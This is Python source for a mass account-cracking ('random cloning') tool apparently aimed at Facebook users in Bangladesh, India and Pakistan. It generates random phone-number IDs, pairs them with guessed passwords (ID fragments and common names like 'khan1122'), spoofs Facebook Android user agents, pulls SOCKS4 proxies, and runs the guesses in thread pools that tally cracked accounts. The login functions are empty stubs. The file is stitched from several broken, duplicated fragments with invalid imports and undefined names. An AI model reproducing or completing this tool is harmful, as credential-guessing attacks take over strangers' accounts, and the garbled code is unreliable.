
import requests
import bs4
import json
import uuid
import os
import sys
import random
import datetime
import time
import re
import urllib3
import base64
import string
import platform
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as ThreadPool
princp = []
id = []
user = []
rrtc = []
memek = []
loop = 0
ok = []
cp = []
prox = []
G = '\x1b[38;5;46m'
W = '\x1b[38;5;15m'
B = '\x1b[38;5;8m'
Y = '\x1b[38;5;226m'
A = '\x1b[38;5;123m'
R = '\x1b[38;5;160m'
O = '\x1b[38;5;81m'
X = '\x1b[38;5;205m'
P = '\x1b[0;34m'
dic = {'1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL', '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST', '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'}
now = datetime.datetime.now()
day = str(now.day)
sex1 = str(now.month)
month = dic[sex1]
sex2 = str(now.year)
date = day + '-' + month + '-' + sex2
G1 = '\x1b[1;97m'
G2 = '\x1b[38;5;196m'
G3 = '\x1b[1;35m'
G4 = '\x1b[38;5;48m'
G5 = '\x1b[38;5;47m'
X5 = '\x1b[38;5;49m'
T = '\x1b[38;5;50m'
U = '\x1b[1;34m'
S = '\x1b[38;5;14m'
M = '\x1b[38;5;122m'
G0 = '\x1b[38;5;86m'
E = '\x1b[38;5;121m'
xd = '\x1b[1;96m'
xd1 = '\x1b[1;32m'
xd2 = '\x1b[1;90m'
xd3 = '\x1b[1;33m'
xd4 = ' '
xd5 = '〖'
xd6 = '➤'
xd0 = '〗'
xdx = '1'
os.system('clear')
os.system('pip uninstall requests -y;pip install requests')
os.system('git pull --quiet 2>/dev/null')
if platform.architecture()[0] == '64bit':
    print('\x1b[38;5;196m[\x1b[1;97m➤\x1b[38;5;196m]\x1b[38;5;46m YOU ARE 64BIT USER')
    time.sleep(5)
else:
    print('\x1b[38;5;196m[\x1b[1;97m➤\x1b[38;5;196m]\x1b[38;5;46m YOU ARE 32BIT USER')
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('Proksi.txt', 'w').write(prox)
except Exception as e:
    pass
logo = '''\n
d8888b.  .d8b.  db   dD d888888b d8888b. \n
88  `8D d8' `8b 88 ,8P'   `88'   88  `8D \n
88oobY' 88ooo88 88,8P      88    88oooY' \n
88`8b   88~~~88 88`8b      88    88~~~b. \n
88 `88. 88   88 88 `88.   .88.   88   8D \n
88   YD YP   YP YP   YD Y888888P Y8888P' 
''' + G2 + '〘' + G1 + ' rahmaN' + G2 + ' 〙\n' + A + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n ' + G1 + 'Owear    ' + G2 + ' :' + G1 + ' Rakib Rahman\n ' + G1 + 'Github   ' + G2 + ' :' + G1 + ' Team-Rrtc' + R + '143\n ' + G1 + 'Tools   ' + G2 + '  :' + G1 + ' Random\n ' + G1 + 'Status ' + G2 + '   :' + G1 + ' Free\n ' + G1 + 'Version  ' + G2 + ' : ' + G1 + date + '.' + R + '1 \x1b[1;37m\n' + A + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
print('\x1b]2; TEAM - RRTC\x07', end='')
def clear():
    os.system('clear')
    print(logo)
def linex():
    print(A + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def XRRTC():
    clear()
    print(xd1 + ' BANGLADESH RANDOM CLONING ')
    print(xd2 + ' INDIA RANDOM CLONING  ')
    print(xd3 + ' PAKISTAN RANDOM CLONING  ')
    print(xd0 + ' EXIT TOOLS ')
    linex()
    ___option___ = input(xdx + ' SELECTION ' + R + ':' + G + ' ')    
    if ___option___ in ('1',):
        os.system('xdg-open https://t.me/termuxscripgift')
        rrtc.append('1')
        ______randomxmenu_______()
    elif ___option___ in ('2',):
        os.system('xdg-open https://t.me/MR_rrtc_143')
        rrtc.append('2')
        ______randomxmenu_______()
    elif ___option___ in ('3',):
        os.system('xdg-open https://t.me/MR_rrtc_143')
        rrtc.append('3')
        ______randomxmenu_______()
    elif ___option___ in ('0',):
        exit()
    else:
        linex()
        print(xd + ' OPTION NOT FOUND ')
        linex()
        time.sleep(1)
        print(xd + ' TRY AGAIN ')
        time.sleep(1)
        mrrrtc()
def ______randomxmenu_______():
    clear()
    if '1' in rrtc:
        print(xd + ' EXAMPLE ' + R + ':' + G + ' 013 ' + R + '|' + G + ' 016 ' + R + '|' + G + ' 017 ' + R + '|' + G + ' 018 ' + R + '|' + G + ' 019 ')
    elif '2' in rrtc:
        print(xd + ' EXAMPLE ' + R + ':' + G + ' +91639 ' + R + '|' + G + ' +91600 ' + R + '|' + G + ' +91620 ')
    elif '3' in rrtc:
        print(xd + ' EXAMPLE ' + R + ':' + G + ' 0306 ' + R + '|' + G + ' 0315 ' + R + '|' + G + ' 0335 ' + R + '|' + G + ' 0345 ')   
    code = input(xdx + ' ENTER SIM CODE ' + R + ':' + G + ' ')
    print(xd + ' EXAMPLE ' + R + ':' + G + ' 1000 ' + R + '|' + G + ' 5555 ' + R + '|' + G + ' 7777 ' + R + '|' + G + ' 99999 ')
    limit = int(input(xdx + ' ENTER CRACK LIMIT ' + R + ':' + G + ' '))
    print(xd1 + ' METHOD M1 ' + R + '〖' + G + 'GP' + R + '/' + G + 'ROB' + R + '/' + G + 'WIFI' + R + '〗 ')
    print(xd2 + ' METHOD M2 ' + R + '〖' + G + 'BL' + R + '/' + G + 'AIR' + R + '/' + G + 'WIFI' + R + '〗 ')
    ___method___ = input(xdx + ' ENTER METHOD ' + R + ':' + G + ' ')    
    for nmbr in range(limit):
        gang = ''.join(random.choice(string.digits) for _ in range(8))
        ____rrtc____ = code + gang
        user.append(____rrtc____)    
    with ThreadPool(max_workers=30) as tl:
        tl.clear = clear
        tl.linex = linex
        love = str(len(user))
        ids = str(len(ok))
        pasx = str(len(cp))
        print(A + '[' + R + '➤' + A + ']' + Y + ' TOTAL IDS ' + R + ':' + G + ' ' + love)
        print(A + '[' + R + '➤' + A + ']' + Y + ' SIM CODE ' + R + ':' + G + ' ' + code)
        print(A + '[' + R + '➤' + A + ']' + Y + ' METHOD ' + R + ':' + M + ' M' + ___method___)
        print(A + '[' + R + '➤' + A + ']' + Y + ' STATUS ' + R + ':' + G + ' OK/' + Y + 'CP ' + R + ':' + S + ' ' + ids + '/' + Y + pasx)
        linex()        
        for guru in user:
            pasx = ''.join(random.choice(string.digits) for _ in range(6))
            if ___method___ in ('1',):
                tl.submit(____methodA____, guru, pasx)
            elif ___method___ in ('2',):
                tl.submit(____methodB____, guru, pasx)
            else:
                exit()
def ____methodA____():
    pass
def ____methodB____():
    pass
def mrrrtc():
    XRRTC()
if __name__ == '__main__':
    XRRTC()
import random
import string
from concurrent.futures import ThreadPoolExecutor
def ______randomxmenu_______():
    def digit_generator_8():
        return (random.choice(string.digits) for _ in range(8))    
    def digit_generator_6():
        return (random.choice(string.digits) for _ in range(6))    
    def digit_generator_7():
        return (random.choice(string.digits) for _ in range(7))
    max_workers = 'max_workers'    
    messages = {
        'code_separator': ' CODE ',
        'dash_separator': ':-',
        'arrow_separator': ' <-> ',
        'date_label': 'DATE ',
        'uid_label': ' UID  ',
        'uid_separator': ':- ',
        'method_label': '  <-> ',
        'method_text': 'METHOD ',
        'turn_text': ' TURN ',
        'bracket_open': '[',
        'status_on': 'ON',
        'status_off': 'OFF',
        'airplane_mode_text': '] AIRPLANE MODE EVERY ',
        'min_text': ' MIN',
        'cloning_started': ' YOUR CLONING STARTED',
        'process_completed': ' THE PROCESS HAS COMPLETED',
        'total_ok': ' TOTAL OK',
        'cp_prefix': 'CP ',
        'color_code': '\x1b[1;37m'   }    
    numbers = [
        5,
        '57273200',
        '57575751', 
        '59039200' ]
    passwords = [
        'khankhan',
        'khan1122', 
        'ali12345',
        'khanbaba',
        'pakistan',
        'khan12345',
        'ali1122',
        'khankhan12345',
        'khan',
        'baloch',
        'pubg',
        'pubg1122'    ]
    option_1 = ('1',)
    option_2 = ('2',)
    return {
        'digit_generators': {
            8: digit_generator_8(),
            6: digit_generator_6(), 
            7: digit_generator_7()
        },
        'messages': messages,
        'numbers': numbers,
        'passwords': passwords,
        'options': {
            'option_1': option_1,
            'option_2': option_2
        },
        'max_workers_param': max_workers
    }
def generate_random_digits(length):
    """Generate random digits of specified length"""
    return (random.choice(string.digits) for _ in range(length))
if __name__ == "__main__":
    result = ______randomxmenu_______()
    for i, digit in enumerate(result['digit_generators'][8]):
        if i >= 8:  # Limit to prevent infinite generation
            break
        print(f"Random digit {i+1}: {digit}")
    print(result['messages']['cloning_started'])
    print(result['messages']['color_code'] + result['messages']['process_completed'])
    print(result['messages']['total_ok'])
import random
import string
from concurrent.futures import ThreadPool
from datetime import datetime
xd = ""
xdx = ""
xd1 = ""
xd2 = ""
R = ""
G = ""
A = ""
Y = ""
M = ""
W = ""
rrtc = ""
date = datetime.now().strftime("%Y-%m-%d")
user = []
def clear():
    """Clear screen function"""
    import os
    os.system('cls' if os.name == 'nt' else 'clear')
def linex():
    """Line separator function"""
    print("-" * 50)
clear()
if '1' in rrtc:
    print(f"{xd} EXAMPLE {R}:{G} 013 {R}|{G} 016 {R}|{G} 017 {R}|{G} 018 {R}|{G} 019 ")
    linex()
if '2' in rrtc:
    print(f"{xd} EXAMPLE {R}:{G} +91639 {R}|{G} +91600 {R}|{G} +91620 ")
    linex()
if '3' in rrtc:
    print(f"{xd} EXAMPLE {R}:{G} 0306 {R}|{G} 0315 {R}|{G} 0335 {R}|{G} 0345 ")
    linex()
code = input(f"{xdx} ENTER SIM CODE {R}:{G} ")
linex()
clear()
print(f"{xd} EXAMPLE {R}:{G} 1000 {R}|{G} 5555 {R}|{G} 7777 {R}|{G} 99999 ")
linex()
limit = int(input(f"{xdx} ENTER CRACK LIMIT {R}:{G} "))
clear()
print(f"{xd1} METHOD M1 {R}〖{G}GP{R}/{G}ROB{R}/{G}WIFI{R}〗 ")
print(f"{xd2} METHOD M2 {R}〖{G}BL{R}/{G}AIR{R}/{G}WIFI{R}〗 ")
linex()
___method___ = input(f"{xdx} ENTER METHOD {R}:{G} ")
for nmbr in range(int(limit)):
    if '1' in rrtc:
        gang = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(gang)  
    if '2' in rrtc:
        gang = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(gang) 
    if '3' in rrtc:
        gang = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(gang)
with ThreadPool(max_workers=60) as ____rrtc____:
    clear()
    tl = str(len(user))
    print(f"{xd}{A} CODE {R}:- {A} {code} {Y} <-> {A}DATE {R} :-{M} {date} ")
    print(f"{xd}{A} UID  {R}:- {W}{tl} {Y}  <-> {A}")
print(f'METHOD {R}:- {S}{___method___}')
print(f'{xd}{A} TURN {G1}[{A}ON{G1}/{R}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN')
print(f'{xd}{A} YOUR CLONING STARTED')
linex()
for love in user:
    ids = code + love
    if '1' in rrtc:
        pasx = [ids, love, ids[:6], ids[:7], ids[:8], ids[5:]]  
    if '2' in rrtc:
        pasx = [ids, love, ids[:6], '57273200', '57575751', '59039200']    
    if '3' in rrtc:
        pasx = [ids, love, ids[5:], 'khankhan', 'khan1122', 'ali12345', 'khanbaba', 'pakistan', 'khan12345', 'ali1122', 'khankhan12345', 'khan', 'baloch', 'pubg', 'pubg1122']
    if ___method___ in ('1',):
        ____rrtc____.submit(____methodA____, ids, pasx, tl)
    elif ___method___ in ('2',):
        ____rrtc____.submit(____methodB____, ids, pasx, tl)
try:
    print('\x1b[1;37m')
    linex()
    print(f'{xd} THE PROCESS HAS COMPLETED')
    print(f'{xd} TOTAL OK{R}|{G}CP {R}:{G} ' + str(len(ok)) + f'{R}|{G}' + str(len(cp)))
    linex()
    exit()
except:
    print('\x1b[1;37m')
    linex()
    print(f'{xd} THE PROCESS HAS COMPLETED')
    print(f'{xd} TOTAL OK{R}|{G}CP {R}:{G} ' + str(len(ok)) + f'{R}|{G}' + str(len(cp)))
    linex()
    exit()
import random
def xrrtc():
    return '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/11.0.0.77.93;FBBV/61279955;FBDM/{density=2.7,width=1440,height=2560};FBLC/en_US;FBCR/Dingtone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/8.0;nullFBCA/armeabi-v7a:armeabi;]'
def RRTC():
    version = random.choice((
        '14',
        '15',
        '10',
        '13',
        '7.0.0',
        '7.1.1',
        '9',
        '12',
        '11',
        '9.0',
        '8.0.0',
        '7.1.2',
        '7.0',
        '4',
        '5',
        '4.4.2',
        '5.1.1',
        '6.0.1',
        '9.0.1',    ))
    model = random.choice((
        'SM-T835',
        'SM-S901U',
        'SM-S134DL',
        'SM-J250F',
        'SM-A217F',
        'SM-A326B',
        'SM-A125F',
        'SM-A720F',
        'SM-A326U',
        'SM-G532M',
        'SM-J410G',
        'SM-A205GN',
        'SM-A205GN',
        'SM-A505GN',
        'SM-G930F',
        'SM-J210F',
        'SM-N9005',
        'SM-J210F',))    
    build = random.choice((
        'MMB29Q',
        'R16NW',
        'LRX22C',
        'R16NW',
        'KTU84P',
        'JLS36C',
        'NJH47F',
        'PPR1.180610.011',
        'QP1A.190711.020',
        'NRD90M',
        'RP1A.200720.012',
        'M1AJB',
        'MMB29T',))    
    ver = str(random.randint(77, 577))
    ver2 = str(random.randint(57, 57))   
    return 'Mozilla/5.0 (Linux; Android ' + version + '; ' + model + ' Build/' + build + '; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/' + ver + '.0.' + ver2 + '.8 Mobile Safari/537.36'
import random
version = random.choice(['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
model = random.choice(['Infinix X650', 'Infinix X688C', 'Infinix X682B', 'Infinix X6811', 'Infinix X6815', 'Infinix X670', 'Infinix X689', 'Infinix X683', 'Infinix X657', 'Infinix X663', 'Infinix X604', 'Infinix X573', 'Infinix X559C', 'Infinix X6831', 'Infinix X612'])
build = random.choice(['MMB29Q', 'R16NW', 'LRX22C', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T'])
ver = str(random.choice(range(77, 576)))
ver2 = str(random.choice(range(57, 76)))
user_agent = f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'
print(user_agent)  # This would be the result if this was the main executionimport random

def sava():
    version = random.choice(['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice(['Infinix X650', 'Infinix X688C', 'Infinix X682B', 'Infinix X6811', 'Infinix X6815', 'Infinix X670', 'Infinix X689', 'Infinix X683', 'Infinix X657', 'Infinix X663', 'Infinix X604', 'Infinix X573', 'Infinix X559C', 'Infinix X6831', 'Infinix X612'])
    build = random.choice(['MMB29Q', 'R16NW', 'LRX22C', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T'])
    ver = str(random.randint(77, 576))
    ver2 = str(random.randint(57, 76))
    return f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'
import random
import str
def generate_user_agent():
    oppo = list(('CPH1869', 'CPH1929', 'CPH2107', 'CPH2238', 'CPH2389', 'CPH2401', 'CPH2407', 'CPH2413', 'CPH2415', 'CPH2417', 'CPH2419', 'CPH2455', 'CPH2459', 'CPH2461', 'CPH2471', 'CPH2473', 'CPH2477', 'CPH8893', 'CPH2321', 'CPH2341', 'CPH2373', 'CPH2083', 'CPH2071', 'CPH2077', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH1923', 'CPH1925', 'CPH1837', 'CPH2015', 'CPH2073', 'CPH2081', 'CPH2029', 'CPH2031', 'CPH2137', 'CPH1605', 'CPH1803', 'CPH1853', 'CPH1805', 'CPH1809', 'CPH1851', 'CPH1931', 'CPH1959', 'CPH1933', 'CPH1935', 'CPH1943', 'CPH2061', 'CPH2069', 'CPH2127', 'CPH2131', 'CPH2139', 'CPH2135', 'CPH2239', 'CPH2195', 'CPH2273', 'CPH2325', 'CPH2309', 'CPH1701', 'CPH2387', 'CPH1909', 'CPH1920', 'CPH1912', 'CPH1901', 'CPH1903', 'CPH1905', 'CPH1717', 'CPH1801', 'CPH2067', 'CPH2099', 'CPH2161', 'CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH2339', 'CPH1715', 'CPH2385', 'CPH1729', 'CPH1827', 'CPH1938', 'CPH1937', 'CPH1939', 'CPH1941', 'CPH2001', 'CPH2021', 'CPH2059', 'CPH2121', 'CPH2123', 'CPH2203', 'CPH2333', 'CPH2365', 'CPH1913', 'CPH1911', 'CPH1915', 'CPH1969', 'CPH2209', 'CPH1987', 'CPH2095', 'CPH2119', 'CPH2285', 'CPH2213', 'CPH2223', 'CPH2363', 'CPH1609', 'CPH1613', 'CPH1723', 'CPH1727', 'CPH1725', 'CPH1819', 'CPH1821', 'CPH1825', 'CPH1881', 'CPH1823', 'CPH1871', 'CPH1875', 'CPH2023', 'CPH2005', 'CPH2025', 'CPH2207', 'CPH2173', 'CPH2307', 'CPH2305', 'CPH2337', 'CPH1955', 'CPH1707', 'CPH1719', 'CPH1721', 'CPH1835', 'CPH1831', 'CPH1833', 'CPH1879', 'CPH1893', 'CPH1877', 'CPH1607', 'CPH1611', 'CPH1917', 'CPH1919', 'CPH1907', 'CPH1989', 'CPH1945', 'CPH1951', 'CPH2043', 'CPH2035', 'CPH2037', 'CPH2036', 'CPH2009', 'CPH2013', 'CPH2113', 'CPH2091', 'CPH2125', 'CPH2109', 'CPH2089', 'CPH2065', 'CPH2159', 'CPH2145', 'CPH2205', 'CPH2201', 'CPH2199', 'CPH2217', 'CPH1921', 'CPH2211', 'CPH2235', 'CPH2251', 'CPH2249', 'CPH2247', 'CPH2237', 'CPH2371', 'CPH2293', 'CPH2353', 'CPH2343', 'CPH2359', 'CPH2357', 'CPH2457', 'CPH1983', 'CPH1979'))    
    redmi = list(('2201116SI', 'M2012K11AI', '22011119TI', '21091116UI', 'M2102K1AC', 'M2012K11I', '22041219I', '22041216I', '2203121C', '2106118C', '2201123G', '2203129G', '2201122G', '2201122C', '2206122SC', '22081212C', '2112123AG', '2112123AC', '2109119BC', 'M2002J9G', 'M2007J1SC', 'M2007J17I', 'M2102J2SC', 'M2007J3SY', 'M2007J17G', 'M2007J3SG', 'M2011K2G', 'M2101K9AG ', 'M2101K9R', '2109119DG', 'M2101K9G', '2109119DI', 'M2012K11G', 'M2102K1G', '21081111RG', '2107113SG', '21051182G', 'M2105K81AC', 'M2105K81C', '21061119DG', '21121119SG', '22011119UY', '21061119AG', '21061119AL', '22041219NY', '22041219G', '21061119BI', '220233L2G', '220233L2I', '220333QNY', '220333QAG', 'M2004J7AC', 'M2004J7BC', 'M2004J19C', 'M2006C3MII', 'M2010J19SI', 'M2006C3LG', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'M2010J19SL', 'M2010J19SG', 'M2010J19SY', 'M2012K11AC', 'M2012K10C', 'M2012K11C', '22021211RC'))    
    realme = list(('RMX3516', 'RMX3371', 'RMX3461', 'RMX3286', 'RMX3561', 'RMX3388', 'RMX3311', 'RMX3142', 'RMX2071', 'RMX1805', 'RMX1809', 'RMX1801', 'RMX1807', 'RMX1803', 'RMX1825', 'RMX1821', 'RMX1822', 'RMX1833', 'RMX1851', 'RMX1853', 'RMX1827', 'RMX1911', 'RMX1919', 'RMX1927', 'RMX1971', 'RMX1973', 'RMX2030', 'RMX2032', 'RMX1925', 'RMX1929', 'RMX2001', 'RMX2061', 'RMX2063', 'RMX2040', 'RMX2042', 'RMX2002', 'RMX2151', 'RMX2163', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3474', 'RMX3471', 'RMX3472', 'RMX3392', 'RMX3393', 'RMX3491', 'RMX1811', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX1941', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3203', 'RMX3261', 'RMX3263', 'RMX3193', 'RMX3191', 'RMX3195', 'RMX3197', 'RMX3265', 'RMX3268', 'RMX3269', 'RMX2027', 'RMX2020', 'RMX2021', 'RMX3581', 'RMX3501', 'RMX3503', 'RMX3511', 'RMX3310', 'RMX3312', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3366', 'RMX3361', 'RMX3031', 'RMX3370', 'RMX3357', 'RMX3560', 'RMX3562', 'RMX3350', 'RMX2193', 'RMX2161', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3430', 'RMX3235', 'RMX3506', 'RMX2117', 'RMX2173', 'RMX3161', 'RMX2205', 'RMX3462', 'RMX3478', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3125', 'RMX3043', 'RMX3042', 'RMX3041', 'RMX3092', 'RMX3093', 'RMX3571', 'RMX3475', 'RMX2200', 'RMX2201', 'RMX2111', 'RMX2112', 'RMX1901', 'RMX1903', 'RMX1992', 'RMX1993', 'RMX1991', 'RMX1931', 'RMX2142', 'RMX2081', 'RMX2085', 'RMX2083', 'RMX2086', 'RMX2144', 'RMX2051', 'RMX2025', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2121', 'RMX3115', 'RMX1921'))    
    infinix = list(('X676B', 'X687', 'X609', 'X697', 'X680D', 'X507', 'X605', 'X668', 'X6815B', 'X624', 'X655F', 'X689C', 'X608', 'X698', 'X682B', 'X682C', 'X688C', 'X688B', 'X658E', 'X659B', 'X689B', 'X689', 'X689D', 'X662', 'X662B', 'X675', 'X6812B', 'X6812', 'X6817B', 'X6817', 'X6816C', 'X6816', 'X6816D', 'X668C', 'X665B', 'X665E', 'X510', 'X559C', 'X559F', 'X559', 'X606', 'X606C', 'X606D', 'X623', 'X624B', 'X625C', 'X625D', 'X625B', 'X650D', 'X650B', 'X650', 'X650C', 'X655C', 'X655D', 'X680B', 'X573', 'X573B', 'X622', 'X693', 'X695C', 'X695D', 'X695', 'X663B', 'X663', 'X670', 'X671', 'X671B', 'X672', 'X6819', 'X572', 'X572-LTE', 'X571', 'X604', 'X610B', 'X690', 'X690B', 'X656', 'X692', 'X683', 'X450', 'X5010', 'X501', 'X401', 'X626', 'X626B', 'X652', 'X652A', 'X652B', 'X652C', 'X660B', 'X660C', 'X660', 'X5515', 'X5515F', 'X5515I', 'X609B', 'X5514D', 'X5516B', 'X5516C', 'X627', 'X680', 'X653', 'X653C', 'X657', 'X657B', 'X657C', 'X6511B', 'X6511E', 'X6511', 'X6512', 'X6823C', 'X612B', 'X612', 'X503', 'X511', 'X352', 'X351', 'X530', 'X676C', 'X6821', 'X6823', 'X6827', 'X509', 'X603', 'X6815', 'X620B', 'X620', 'X687B', 'X6811B', 'X6810', 'X6811'))    
    samsung = list(('SM-G920F', 'Moto G', 'Moto X', 'Motorola Moto X', 'Moto G14', 'Moto G Stylus', 'NRD90M', 'MatePad Pro 11', 'nova 11 SE ', 'Mate 60 Pro+ ', 'Huawei Mate 20 Pro', 'Huawei P30 Lite', 'NRD90M', 'SM-T535', 'LRX22G', 'SM-T231', 'KOT49H', 'SM-J320F', 'LMY47V', 'GT-I9190', 'KOT49H', 'GT-N7100', 'KOT49H', 'SM-T561', 'KTU84P', 'GT-N7100', 'KOT49H', 'GT-I9500', 'LRX22C', 'SM-J320F', 'LMY47V', 'SM-G930F', 'NRD90M', 'SM-J320F', 'LMY47V', 'SM-J510FN', 'NMF26X', 'GT-P5100', 'IML74K', 'SM-J320F', 'LMY47V', 'GT-N8000', 'JZO54K', 'SM-T531', 'LRX22G', 'SPH-L720', 'KOT49H', 'GT-I9500', 'JDQ39', 'SM-G935F', 'NRD90M', 'SM-T561', 'KTU84P', 'SM-T531', 'KOT49H', 'SM-J320FN', 'LMY47V', 'SM-A500F', 'MMB29M', 'SM-A500FU', 'MMB29M', 'SM-A500F', 'MMB29M', 'SM-T311', 'KOT49H', 'SM-T531', 'LRX22G', 'SM-J320F', 'LMY47V', 'SM-J320FN', 'LMY47V', 'SM-J320F', 'LMY47V', 'GT-P5210', 'KOT49H', 'SM-T230', 'KOT49H', 'GT-I9192', 'KOT49H', 'SM-T235', 'KOT4', 'GT-N7100', 'KOT49H', 'SM-A500F', 'LRX22G', 'SM-A500F', 'MMB29M', 'GT-N7100', 'KOT49H', 'SM-G920F', 'MMB29K', 'SM-J510FN', 'NMF26X', 'GT-N8000', 'JZO54K', 'SM-J320FN', 'LMY47V', 'SM-J320FN', 'LMY47V', 'SM-A500H', 'MMB29M', 'GT-I9300', 'JSS15J', 'GT-I9500', 'LRX22C', 'SM-J320F', 'LMY4', 'SM-J510FN', 'NMF26X', 'SM-A500F', 'MMB29M', 'GT-N8000', 'KOT49H', 'SM-T561', 'KTU84P', 'SM-G900F', 'KOT49H', 'GT-S7390', 'JZO54K', 'SM-J320F', 'LMY47V', 'GT-P5100', 'JZO54K', 'SM-A500FU', 'MMB29M', 'SM-G930F', 'NRD90M', 'SM-J510FN', 'NMF26X', 'SM-T561', 'KTU84P', 'GT-N8000', 'KOT49H', 'SM-T531', 'LRX22G', 'SM-J510FN', 'MMB29M', 'SM-J510FN', 'NMF26X', 'SM-J320F', 'LMY47V', 'GT-P5110', 'JDQ39', 'GT-I9301I', 'KOT49H', 'SM-A500F', 'LRX22G', 'SM-G930F', 'NRD90M', 'SM-T311', 'KOT4', 'GT-P5200', 'KOT49H', 'GT-I9301I', 'KOT49H', 'SM-J320M', 'LMY47V', 'SM-T531', 'LRX22G', 'SM-T820', 'NRD90M', 'GT-I9192', 'KOT49H', 'SM-G935F', 'MMB29K', 'SM-J701F', 'NRD90M;', 'GT-I9301I', 'KOT4', 'SM-J320FN', 'LMY47V', 'SM-T111', 'JDQ39', 'SM-A500F', 'MMB29M', 'SM-J510FN', 'NMF2', 'SM-T705', 'LRX22G', 'SM-G920F', 'NRD90M', 'GT-N5100', 'JZO54K', 'GT-I9300I', 'KTU84P', 'GT-I9300I', 'KTU84P', 'GT-N8000', 'KOT49H', 'GT-N8000', 'KOT49H', 'SM-A500F', 'MMB29M', 'GT-I9190', 'KOT49H', 'SM-J510FN', 'NMF26X', 'SM-J320F', 'LMY47V', 'GT-P5100', 'JDQ39', 'GT-I9300I', 'KTU84P', 'GT-N5100', 'JZO54K', 'GT-N8000', 'KOT49H', 'GT-I9500', 'LRX22C', 'SM-J320FN', 'LMY47V', 'SM-A500F', 'MMB29M', 'GT-N8000', 'JZO54K', 'SM-T805', 'LRX22G', 'SM-T231', 'KOT49H', 'GT-N5100', 'JZO54K', 'SM-J320H', 'LMY47V', 'SM-T231', 'KOT49H', 'SM-G930F', 'NRD90M', 'SM-G935F', 'NRD90M', 'SM-T310', 'KOT49H', 'GT-N8000', 'KOT49H', 'GT-I9300I', 'KTU84P', 'SM-G920F', 'NRD90M', 'SM-J510FN', 'NMF26X', 'SM-T705', 'LRX22G;', 'GT-P3110', 'JZO54K', 'GT-I9192', 'KOT49H', 'SM-J320F', 'LMY47V', 'SM-G920F', 'NRD90M', 'GT-I9300', 'IMM76D', 'SM-G950F', 'NRD90M', 'SM-J320F', 'LMY47V', 'SM-J510FN', 'NMF26X;', 'SM-J701F', 'NRD90M', 'SM-A500F', 'LRX22G', 'SM-T231', 'KOT49H', 'SM-T311', 'KOT49H', 'SM-J320FN', 'LMY47V', 'GT-P5210', 'KOT49H', 'SM-T805', 'LRX22G', 'GT-I9500', 'LRX22C', 'GT-P5200', 'KOT49H', 'GT-I9301I', 'KOT49H', 'GT-I9300', 'JSS15J', 'GT-N7100', 'KOT49H', 'SM-T531', 'LRX22G', 'SM-T820', 'NRD90M', 'SM-T315', 'JDQ39', 'SM-J320F', 'LMY47V', 'GT-I9190', 'KOT49H', 'GT-P5220', 'JDQ39', 'SM-T525', 'KOT49H', 'SM-T555', 'LRX22G', 'GT-I9190', 'KOT49H', 'SM-J510FN', 'NMF26X;', 'SM-A500F', 'MMB29M', 'GT-I9192', 'KOT49H', 'GT-P5100', 'JDQ', 'SM-T311', 'KOT49H'))    
